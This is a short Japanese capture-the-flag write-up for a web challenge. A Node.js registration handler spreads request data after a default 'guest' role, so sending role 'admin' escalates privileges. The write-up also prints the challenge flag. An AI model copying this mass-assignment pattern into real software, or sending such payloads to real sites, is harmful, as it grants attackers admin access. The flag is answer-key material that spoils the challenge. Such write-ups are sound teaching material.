## 問題理解
問題のサイトはログインをするとニックネームとユーザーのロールが表示されるサイトとなっている。
ユーザーは`register`機能から新規登録ができるようになっており、新規登録時には下記の流れで処理をしている
1. リクエストボディから基となるインスタンス,username,password,nicknameを取得、usernameとnickname(ある場合)の文字列に小文字、英数字以外が含まれている場合はエラーを返す
2. users(保存されているすべてのユーザー)の中にuser_dataが既に存在している場合は`ユーザーが既にいるよ`と返して処理を終える
3. その後該当userに`role=guest`を付与し、レスポンスのcookie内にusernameを入れてルートページにリダイレクトする
## 解法
index.jsの/registerの下記ポイントが脆弱である
```js
  users.set(user_data.username, {
    role: "guest",
    ...user_data,
  });
```
これはスプレッド構文という書き方なのだが、同じkeyがある場合**あとから書いたものが上書きする**という挙動がある。なので攻撃する際にこちらでroleをadminと送信すると下記のようになる
- 本来の挙動
```js
const user_data = { username: "test", password: "test", nickname: "test" };

{
  role: "guest",
  ...user_data,
}
// ↓ 展開
{
  role: "guest",
  username: "test",
  password: "test",
  nickname: "test"
}
```
- 攻撃パターン
```js
const user_data = { username: "attack", password: "attack", nickname: "attack",role:"admin" };

{
  role: "guest",
  ...user_data,
}
// ↓ 展開
{
  role: "admin",
  username: "attack",
  password: "attack",
  nickname: "attack"
}
```
これにより、FLAGが取得できる
<details>
<summary>FLAGの表示</summary>
Alpaca{This_is_badAss_mAss_Assignment}
</details>
私はBurp suite使いましたが開発者ツール使ったりcurlでリクエスト送信でも行けます

### 余談(ひとりごと)
これ解き終わった後先輩が「これtestとかそれっぽい名前でログインしたら答え割れるんじゃね？」って言っててああなるほどって思いました。userのクリア処理実装されているけど問題公開24時間以内なら正解したら提出したの割れるからそれで答えだした人ワンチャンいそうだけどいなそう